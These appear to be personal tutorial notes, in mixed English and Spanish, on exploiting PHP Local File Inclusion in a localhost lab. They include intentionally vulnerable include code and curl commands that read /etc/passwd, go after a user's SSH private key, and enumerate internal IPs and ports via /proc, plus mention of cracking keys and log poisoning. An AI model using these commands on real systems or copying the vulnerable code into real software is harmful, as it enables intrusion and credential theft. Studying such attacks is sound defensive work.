What is an LFI?
What is it? LFI vulnerabilities (Local File Inclusion or inclusion of local files) are vulnerabilities that allow reading any file that is inside the same server, even if the file is outside the web directory where the page is hosted.




Lets open apache server on the folder /var/www/html




service apache2 start 

lsof -i:80 (to see if the service is running)


nano example.php

```
<?php 
 $filename =$_GET['file'] // ?file=test.txt
 include($filename)
?>

```

lets create now another file called test.txt

So, what can we do with this? for example
```
curl -s "http://http://localhost/example.php?file=/etc/passwd" | grep "sh$" 
```
-s (silent, no verbose)
(this is like a cat command with bash)

I can see al the users that are valid users of the system.

I can do for example a search of the ssh key of cds
```
/home/cds/.ssh/id_rsa
```


Esta es una clave privada ssh y si se la ha pasado al "ssh copy id" a este par de claves "igual es una clave autorizada" que puede servir para conectarse a la maquina sin proporcionar passwd . 
Pero si estuviera protegida por contraseña podriamos usar ssh to john con john the ripper y obtener el hash equivalente e intentar obtener la contraseña con la clave id rsa.

Nos va a pedir la contraseña y la introducimos, seria la que previamente habriamos crackeado por fuerzabruta (no es la del usuario)

Mas adelante vamos a ver ejecucion remota de comandos con LOG-POISONING




And now we can still following enumerating things on the system , for example process 


(this is not on my computer, maybe is on other older distributions of linux) INVESTIGATE MORE ABOUT THIS
```
http://localhost/example.php?file=/proc/sched_debug
```

Another important one is 
```
localhost/example.php?file=/proc/net/fib_trie
```

This is for enumerate the internal network of the machine

```
curl -s "http://localhost/example.php?file=/proc/net/fib_trie" | grep -i "host local" -B 1
```

this shows my ip.

Now we are going to grep only by the number of the ip with a regular expression

```
curl -s "http://localhost/example.php?file=/proc/net/fib_trie" | grep -i "host local" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
```

to eliminate the repetitions oof the ips we do this

```
curl -s "http://localhost/example.php?file=/proc/net/fib_trie" | grep -i "host local" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u
```

ANOTHER IMPORTANT FILE THAT WE CAN SEE IS THE:  proc net tcp
you can see the internal ports working on the machine (SSRF) all of them in  hexadecimal
```
/proc/net/tcp
```

if you want to filter the ports
```
curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v 'local_address' | awk '{print$2}' FS=":" | sort -u
```
awk= takes an argument(in this case the second argument)
grep -v =(-v eliminates an argument in this case 'local_adress')
awk = takes the second argument FS=":" takes as a reference the : as delimiter of arguments
sort -u = deletes repetitions

Now he is doing a for cycle representing the ports to decimal

```
for port in $(curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v 'local_address' | awk '{print$2}' FS=":" | sort -u) ;do echo "[$port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
```

"ibase=16; $port" | bc (this translates the hexadecimal to decimal)
bc= calculates stuff

## NOTE: The machines haves some protections , watching of firewall and sometimes you cannot see things outside of the LAN ##


This is a way of sanitization (still vulnerable to path traversal) that we specify that the archive must be on the route /var/www/html
```
<?php 
 $filename = $_GET['file'];
 include("/var/www/html" . $filename);
?>
```

we can add an extension too
```
<?php 
 $filename = $_GET['file'];
 include("/var/www/html" . $filename .txt);
?>
```